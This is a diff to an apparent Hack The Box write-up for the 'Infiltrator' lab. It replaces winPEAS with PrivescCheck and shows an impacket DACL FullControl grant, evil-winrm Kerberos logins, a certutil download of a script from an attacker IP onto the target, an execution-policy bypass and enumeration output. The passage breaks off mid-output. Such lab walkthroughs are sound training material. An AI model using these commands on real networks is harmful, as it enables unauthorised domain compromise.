@@ -738,6 +738,7 @@ root@kali:~# export KRB5CCNAME=d.anderson.ccache
 
 ```console
 root@kali:~# impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip dc01.infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
 [*] DACL backed up to dacledit-20241226-141003.bak
@@ -806,15 +807,13 @@ root@kali:~# export KRB5CCNAME=m.harris.ccache
 The KDC for `infiltrator.htb` could not be located:
 
 ```console
-root@kali:~# evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb
+root@kali:~# evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
 
 Evil-WinRM shell v3.7
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: User is not needed for Kerberos auth. Ticket will be used
 
 Info: Establishing connection to remote endpoint
 
@@ -848,15 +847,13 @@ EOF
 tah-dah:
 
 ```console
-root@kali:~# evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb
+root@kali:~# evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
 
 Evil-WinRM shell v3.7
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: User is not needed for Kerberos auth. Ticket will be used
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\M.harris\Documents> whoami
@@ -921,341 +918,664 @@ Get the user flag first:
 
 ## 6. Privilege escalation
 
-### 6.1. [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+### 6.1. [PrivescCheck](https://github.com/itm4n/PrivescCheck)
 
 #### Prepare Kali
 
 ```sh
-VERSION=$(curl -sI https://github.com/peass-ng/PEASS-ng/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
-curl -sLo /var/www/html/winPEAS.bat https://github.com/peass-ng/PEASS-ng/releases/download/$VERSION/winPEAS.bat
+curl -Lo /var/www/html/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1
 ```
 
 #### Download and run on target
 
 ```cmd
-*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe /urlcache /f /split http://10.10.14.35/winPEAS.bat .\winPEAS.bat
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/PrivescCheck.ps1
 ****  Online  ****
-  0000  ...
-  8f0e
+  000000  ...
+  02e523
 CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Set-ExecutionPolicy Bypass -Scope CurrentUser
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Import-Module .\PrivescCheck.ps1
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Get-Module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
+Manifest   3.0.0.0    Microsoft.PowerShell.Security       {ConvertFrom-SecureString, ConvertTo-SecureString, Get-Acl, Get-AuthenticodeSignature...}
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     0.0        PrivescCheck
 ```
 
-<details><summary>Full WinPEAS Output</summary>
+<details><summary>Full PrivescCheck Output</summary>
 
 ```cmd
-*Evil-WinRM* PS C:\Users\M.harris\Documents> .\winPEAS.bat
-
-            ((,.,/((((((((((((((((((((/,  */
-     ,/*,..*(((((((((((((((((((((((((((((((((,
-   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
-   ((((((((((((((((* *****,,,/########## .(* ,((((((
-   (((((((((((/* ******************/####### .(. ((((((
-   ((((((..******************/@@@@@/***/###### /((((((
-   ,,..**********************@@@@@@@@@@(***,#### ../(((((
-   , ,**********************#@@@@@#@@@@*********##((/ /((((
-   ..(((##########*********/#@@@@@@@@@/*************,,..((((
-   .(((################(/******/@@@@@#****************.. /((
-   .((########################(/************************..*(
-   .((#############################(/********************.,(
-   .((##################################(/***************..(
-   .((######################################(************..(
-   .((######(,.***.,(###################(..***(/*********..(
-   .((######*(#####((##################((######/(********..(
-   .((##################(/**********(################(**...(
-   .(((####################/*******(###################.((((
-   .(((((############################################/  /((
-   ..(((((#########################################(..(((((.
-   ....(((((#####################################( .((((((.
-   ......(((((#################################( .(((((((.
-   (((((((((. ,(############################(../(((((((((.
-       (((((((((/,  ,####################(/..((((((((((.
-             (((((((((/,.  ,*//////*,. ./(((((((((((.
-                (((((((((((((((((((((((((((/
-                       by carlospolop
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ User identity                                     ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the current user (name, domain name)   ┃
+┃ and its access token (SID, integrity level, authentication   ┃
+┃ ID).                                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational
 
 
-/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
-   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
-   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
-   Use it at your own networks and/or with the network owner's permission.
-
-[*] BASIC SYSTEM INFO
- [+] WINDOWS OS
-   [i] Check for vulnerabilities for the OS version with the applied patches
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
-winPEAS.bat : Access is denied.
-    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-
-ERROR:Description = Access denied
-Access is denied.
- [+] DATE and TIME
-   [i] You may need to adjust your local date/time to exploit some vulnerability
-Wed 12/25/2024
-11:23 PM
-
- [+] Audit Settings
-   [i] Check what is being logged
-
-
- [+] WEF Settings
-   [i] Check where are being sent the logs
-
- [+] Legacy Microsoft LAPS installed?
-   [i] Check what is being logged
-
- [+] Windows LAPS installed?
-   [i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory
-
- [+] LSA protection?
-   [i] Active if "1"
-
-
- [+] Credential Guard?
-   [i] Active if "1" or "2"
+Name             : INFILTRATOR\M.harris
+SID              : S-1-5-21-2606098828-3734741516-3625406802-1105
+IntegrityLevel   : Medium Plus Mandatory Level (S-1-16-8448)
+SessionId        : 0
+TokenId          : 00000000-008b045e
+AuthenticationId : 00000000-008b0431
+OriginId         : 00000000-00000000
+ModifiedId       : 00000000-008b0438
+Source           : Kerberos (00000000-0000c7d3)
 
 
 
- [+] WDigest?
-   [i] Plain-text creds in memory if "1"
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ User groups                                       ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the groups the current user belongs to ┃
+┃ (name, type, SID).                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational
 
- [+] Number of cached creds
-   [i] You need System-rights to extract them
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-    CACHEDLOGONSCOUNT    REG_SZ    10
-
- [+] UAC Settings
-   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
-
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA    REG_DWORD    0x1
-
-
- [+] Registered Anti-Virus(AV)
-ERROR:Description = Invalid namespace
-Checking for defender whitelisted PATHS
-
- [+] PowerShell settings
-PowerShell v2 Version:
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
-    PowerShellVersion    REG_SZ    2.0
-
-PowerShell v5 Version:
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
-    PowerShellVersion    REG_SZ    5.1.17763.1
-
-Transcriptions Settings:
-Module logging settings:
-Scriptblog logging settings:
-
-PS default transcript history
-
-Checking PS history file
-
- [+] MOUNTED DISKS
-   [i] Maybe you find something interesting
+Name                                        Type           SID
+----                                        ----           ---
+INFILTRATOR\Domain Users                    Group          S-1-5-21-2606098828-3734741516-3625406802-513
+Everyone                                    WellKnownGroup S-1-1-0
+BUILTIN\Remote Management Users             Alias          S-1-5-32-580
+BUILTIN\Users                               Alias          S-1-5-32-545
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias          S-1-5-32-554
+BUILTIN\Certificate Service DCOM Access     Alias          S-1-5-32-574
+NT AUTHORITY\NETWORK                        WellKnownGroup S-1-5-2
+NT AUTHORITY\Authenticated Users            WellKnownGroup S-1-5-11
+NT AUTHORITY\This Organization              WellKnownGroup S-1-5-15
+INFILTRATOR\Protected Users                 Group          S-1-5-21-2606098828-3734741516-3625406802-525
+INFILTRATOR\Developers                      Group          S-1-5-21-2606098828-3734741516-3625406802-1112
+Authentication authority asserted identity  WellKnownGroup S-1-18-1
+Mandatory Label\Medium Plus Mandatory Level Label          S-1-16-8448
 
 
- [+] ENVIRONMENT
-   [i] Interesting information?
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ User privileges                                   ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user is granted privileges that    ┃
+┃ can be leveraged for local privilege escalation.             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
 
-ALLUSERSPROFILE=C:\ProgramData
-APPDATA=C:\Users\M.harris\AppData\Roaming
-CommonProgramFiles=C:\Program Files\Common Files
-CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
-CommonProgramW6432=C:\Program Files\Common Files
-COMPUTERNAME=DC01
-ComSpec=C:\Windows\system32\cmd.exe
-CurrentFolder=C:\Users\M.harris\Documents\
-CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
-DriverData=C:\Windows\System32\Drivers\DriverData
-E=0x1B[
-expl=no
-LOCALAPPDATA=C:\Users\M.harris\AppData\Local
-long=false
-NUMBER_OF_PROCESSORS=2
-OS=Windows_NT
-Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Output Messenger Server\Plugins\Output\apache2\bin\;C:\Program Files\Output Messenger Server\Plugins\Output\php\;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\;C:\Users\M.harris\AppData\Local\Microsoft\WindowsApps
-PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
-Percentage=1
-PercentageTrack=20
-PROCESSOR_ARCHITECTURE=AMD64
-PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
-PROCESSOR_LEVEL=25
-PROCESSOR_REVISION=0101
-ProgramData=C:\ProgramData
-ProgramFiles=C:\Program Files
-ProgramFiles(x86)=C:\Program Files (x86)
-ProgramW6432=C:\Program Files
-PROMPT=$P$G
-PSModulePath=C:\Users\M.harris\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
-PUBLIC=C:\Users\Public
-SystemDrive=C:
-SystemRoot=C:\Windows
-TEMP=C:\Users\MDB39~1.HAR\AppData\Local\Temp
-TMP=C:\Users\MDB39~1.HAR\AppData\Local\Temp
-USERDNSDOMAIN=INFILTRATOR.HTB
-USERDOMAIN=INFILTRATOR
-USERNAME=M.harris
-USERPROFILE=C:\Users\M.harris
-windir=C:\Windows
+Name                          State   Description                    Exploitable
+----                          -----   -----------                    -----------
+SeMachineAccountPrivilege     Enabled Add workstations to domain           False
+SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False
+SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False
 
- [+] INSTALLED SOFTWARE
-   [i] Some weird software? Check for vulnerabilities in unknow software installed
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
 
-Common Files
-Common Files
-Hyper-V
-internet explorer
-Internet Explorer
-Microsoft.NET
-Output Messenger
-Output Messenger Server
-PackageManagement
-Update Services
-VMware
-Windows Defender
-Windows Defender
-Windows Defender Advanced Threat Protection
-Windows Mail
-Windows Mail
-Windows Media Player
-Windows Media Player
-Windows Multimedia Platform
-Windows Multimedia Platform
-windows nt
-windows nt
-Windows Photo Viewer
-Windows Photo Viewer
-Windows Portable Devices
-Windows Portable Devices
-Windows Security
-WindowsPowerShell
-WindowsPowerShell
-    InstallLocation    REG_SZ    C:\Program Files\Output Messenger Server\
-    InstallLocation    REG_SZ    C:\Program Files\Output Messenger\
-    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ User privileges (GPO)                             ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user is granted privileges,        ┃
+┃ through a group policy, that can be leveraged for local      ┃
+┃ privilege escalation.                                        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ User environment variables                        ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether any environment variables contain sensitive    ┃
+┃ information such as credentials or secrets. Note that this   ┃
+┃ check follows a keyword-based approach and thus might not be ┃
+┃ completely reliable.                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (nothing found)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service list (non-default)                        ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about third-party services. It does so by    ┃
+┃ parsing the target executable's metadata and checking        ┃
+┃ whether the publisher is Microsoft.                          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational
 
- [+] Remote Desktop Credentials Manager
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
 
- [+] WSUS
-   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
+Name        : OutputMessengerApache
+DisplayName : Output Messenger - Apache
+ImagePath   : "C:\Program Files\Output Messenger Server\Plugins\Output\apache2\bin\outputmessenger_httpd.exe" -k runservice
+User        : LocalSystem
+StartMode   : Automatic
 
- [+] RUNNING PROCESSES
-   [i] Something unexpected is running? Check for vulnerabilities
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
-ERROR: Access denied
-   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
-ERROR:Description = Access denied
-   [i] Checking directory permissions of running processes (DLL injection)
-ERROR:Description = Access denied
- [+] RUN AT STARTUP
-   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
-   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup
-C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+Name        : OutputMessengerMySQL
+DisplayName : Output Messenger - MySQL
+ImagePath   : "C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\outputmessenger_mysqld.exe" "--defaults-file=C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini" "OutputMessengerMySQL"
+User        : LocalSystem
+StartMode   : Automatic
 
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+Name        : OutputMessengerServer
+DisplayName : Output Messenger Server
+ImagePath   : "C:\Program Files\Output Messenger Server\OMServerService.exe"
+User        : LocalSystem
+StartMode   : Automatic
 
-Access is denied.*Evil-WinRM* PS C:\Users\M.harris\Documents>
-```
+Name        : ssh-agent
+DisplayName : OpenSSH Authentication Agent
+ImagePath   : C:\Windows\System32\OpenSSH\ssh-agent.exe
+User        : LocalSystem
+StartMode   : Disabled
 
+Name        : VGAuthService
+DisplayName : VMware Alias Manager and Ticket Service
+ImagePath   : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : vm3dservice
+DisplayName : @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service
+ImagePath   : C:\Windows\system32\vm3dservice.exe
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : VMTools
+DisplayName : VMware Tools
+ImagePath   : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Vulnerable Kernel drivers                         ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether known vulnerable kernel drivers are installed. ┃
+┃ It does so by computing the file hash of each driver and     ┃
+┃ comparing the value against the list provided by             ┃
+┃ loldrivers.io.                                               ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+Warning: Service: vwifibus | Path not found: C:\Windows\System32\drivers\vwifibus.sys
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service permissions                               ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a service through the Service Control Manager (SCM).         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service registry permissions                      ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the configuration of a service in the registry.              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service image file permissions                    ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a service's binary or its folder.                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service unquoted paths                            ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are services configured with an          ┃
+┃ exploitable unquoted path that contains spaces.              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Service Control Manager permissions               ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the Service Control Manager (SCM).                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Scheduled task image file permissions             ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a scheduled task's binary or its folder. Note that           ┃
+┃ low-privileged users cannot list all the scheduled tasks.    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Hive file permissions                             ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has read permissions on the   ┃
+┃ SAM/SYSTEM/SECURITY files in the system folder               ┃
+┃ (CVE-2021-36934 - HiveNightmare).                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Hive file shadow copy permissions                 ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has read permissions on the   ┃
+┃ SAM/SYSTEM/SECURITY files stored in volume shadow copies     ┃
+┃ (CVE-2021-36934 - HiveNightmare).                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Unattend file credentials                         ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are any 'unattend' files and whether     ┃
+┃ they contain clear-text credentials.                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ WinLogon credentials                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the 'WinLogon' registry key contains           ┃
+┃ clear-text credentials. Note that entries with an empty      ┃
+┃ password field are filtered out.                             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+Warning: Check 'Vault credentials (creds)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
+Warning: Check 'Vault credentials (list)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Group Policy Preference (GPP) credentials         ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are cached Group Policy Preference (GPP) ┃
+┃ files that contain clear-text passwords.                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ SCCM Network Access Account (NAA) credentials     ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether SCCM NAA credentials are stored in the WMI     ┃
+┃ repository. If so, the username and password DPAPI blobs are ┃
+┃ returned, but can only be decrypted using the SYSTEM's DPAPI ┃
+┃ user key.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ SCCM cache folder credentials                     ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the SCCM cache folders contain files with      ┃
+┃ potentially hard coded credentials, or secrets, using basic  ┃
+┃ keywords such as 'password', or 'secret'.                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ LSA Protection                                    ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether LSA protection is enabled. Note that when LSA  ┃
+┃ protection is enabled, 'lsass.exe' runs as a Protected       ┃
